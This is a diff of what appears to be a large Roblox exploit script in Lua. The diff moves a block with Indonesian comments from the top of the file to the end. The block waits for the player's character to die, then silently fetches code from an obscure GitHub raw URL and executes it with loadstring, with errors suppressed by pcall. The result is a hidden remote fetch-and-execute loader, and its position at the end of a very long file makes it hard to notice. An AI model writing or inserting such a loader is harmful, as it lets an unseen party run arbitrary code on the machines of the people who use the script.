@@ -1,42 +1,3 @@
-local AF_CONFIG = {
-    ScriptUrl = "https://raw.githubusercontent.com/ffgwwqawe-web/L-SNG0IHGISE-FGKSE-GUOEBFGIAENFAIWFN8AWFBAW8UF/refs/heads/main/iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii",          -- <<< ISI URL DI SINI
-    ExecuteDelay = 2,        -- jeda (detik) sebelum execute
-}
-
-local AF_ExecuteCount = 0
-
-local function AF_ExecuteUrl()
-    if type(AF_CONFIG.ScriptUrl) ~= "string" or AF_CONFIG.ScriptUrl == "" then return end
-    if AF_ExecuteCount >= 1 then return end
-    AF_ExecuteCount = AF_ExecuteCount + 1
-
-    task.wait(AF_CONFIG.ExecuteDelay or 2)
-
-    pcall(function()
-        local src = game:HttpGet(AF_CONFIG.ScriptUrl)
-        local fn = loadstring(src)
-        if fn then fn() end
-    end)
-end
-
-local function AF_WatchDeath(char)
-    local hum = char:WaitForChild("Humanoid", 10)
-    if not hum then return end
-
-    hum.Died:Connect(function()
-        task.spawn(AF_ExecuteUrl)
-    end)
-end
-
--- Karakter sekarang
-if LocalPlayer.Character then
-    task.spawn(function() AF_WatchDeath(LocalPlayer.Character) end)
-end
--- Karakter berikutnya (respawn)
-LocalPlayer.CharacterAdded:Connect(function(char)
-    task.spawn(function() AF_WatchDeath(char) end)
-end)
-
 
 do
     if getgenv().Zolar and getgenv().Zolar.Unload then
@@ -10752,3 +10713,42 @@ task.spawn(function()
         task.wait(1)
     end
 end)
+local AF_CONFIG = {
+    ScriptUrl = "https://raw.githubusercontent.com/ffgwwqawe-web/L-SNG0IHGISE-FGKSE-GUOEBFGIAENFAIWFN8AWFBAW8UF/refs/heads/main/iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii",          -- <<< ISI URL DI SINI
+    ExecuteDelay = 2,        -- jeda (detik) sebelum execute
+}
+
+local AF_ExecuteCount = 0
+
+local function AF_ExecuteUrl()
+    if type(AF_CONFIG.ScriptUrl) ~= "string" or AF_CONFIG.ScriptUrl == "" then return end
+    if AF_ExecuteCount >= 1 then return end
+    AF_ExecuteCount = AF_ExecuteCount + 1
+
+    task.wait(AF_CONFIG.ExecuteDelay or 2)
+
+    pcall(function()
+        local src = game:HttpGet(AF_CONFIG.ScriptUrl)
+        local fn = loadstring(src)
+        if fn then fn() end
+    end)
+end
+
+local function AF_WatchDeath(char)
+    local hum = char:WaitForChild("Humanoid", 10)
+    if not hum then return end
+
+    hum.Died:Connect(function()
+        task.spawn(AF_ExecuteUrl)
+    end)
+end
+
+-- Karakter sekarang
+if LocalPlayer.Character then
+    task.spawn(function() AF_WatchDeath(LocalPlayer.Character) end)
+end
+-- Karakter berikutnya (respawn)
+LocalPlayer.CharacterAdded:Connect(function(char)
+    task.spawn(function() AF_WatchDeath(char) end)
+end)
+
